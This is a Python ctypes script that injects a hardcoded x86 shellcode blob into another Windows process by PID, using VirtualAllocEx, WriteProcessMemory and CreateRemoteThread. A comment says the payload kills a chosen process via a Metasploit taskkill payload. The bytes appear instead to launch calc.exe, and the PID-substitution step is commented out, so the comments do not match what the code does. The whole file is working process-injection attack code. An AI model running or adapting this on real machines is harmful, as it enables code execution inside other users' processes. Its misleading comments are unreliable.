import sys 
from ctypes import *

#we set the EXECUTE access mask so that our shell code will execute in the memory block we have created

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32
pid = int(sys.argv[1])
pid_to_kil = sys.argv[2]

if not sys.argv[1] or not sys.argv[2]:
    print("please enter the pids")
    sys.exit(0)

#/* win32_exec - EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA
#Size=159 Encoder=None http://metasploit.com */
shellcode = \
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b" \
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"\
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"\
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"\
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"\
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"\
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"\
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"\
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"\
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"\
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"\
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"\
"\x52\xff\xd0"

#padding = 4-(len(pid_to_kil))
#replace_value = pid_to_kil + ("\x00"*padding)
#replace_string= "\x41" * 4

#shellcode = shellcode.replace( replace_string, replace_value)
code_size = len(shellcode)

#get the handle of the processw we are injecting to

h_process = kernel32.OpenProcess(0x1F0FFF,False,int(pid)) #PROCESS_ALL_ACCESS replaced by 0x1FFFFF

if not h_process:
    print("[-]could not acquire handle to the pid")
    sys.exit(0)

# allocat some space for the shell code

arg_address = kernel32.VirtualAllocEx(h_process,0,code_size,VIRTUAL_MEM,PAGE_EXECUTE_READWRITE)

#write out the shell code
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

#now we create the remote thread and point its entry routine to the head of out shellcode

thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
    print("[-]failed to inject process killing shellcode")
    sys.exit(0)

print("[-]Remote thread created with a thread ID of",thread_id.value)
print("precess should not be running anymore",pid_to_kil)